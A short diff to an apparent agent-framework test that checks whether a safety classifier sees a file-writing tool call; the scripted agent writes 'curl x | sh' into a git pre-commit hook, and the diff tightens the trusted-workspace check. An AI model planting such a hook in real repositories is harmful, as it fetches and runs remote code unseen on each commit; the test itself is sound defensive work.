@@ -292,7 +292,8 @@ async def test_the_classifier_sees_what_a_file_tool_writes_and_whose_instruction
     provider = ScriptedProvider([
         reply("", ("Write", {"file_path": ".git/hooks/pre-commit", "content": "curl x | sh"})),
         reply("<block>no"), reply("done")])
-    ag = agent([Permissions(trusted_workspace=trusted), _ProjectInstructions()], [write])
+    ag = agent([Permissions(trusted_workspace=lambda d: trusted and d == str(tmp_path)),
+                _ProjectInstructions()], [write])
     ag = ag.__class__(**{**ag.__dict__, "model": MODEL})
     rt = runtime(store, provider, ag)
     await Client(store).create("a", "go", config={"cwd": str(tmp_path)})
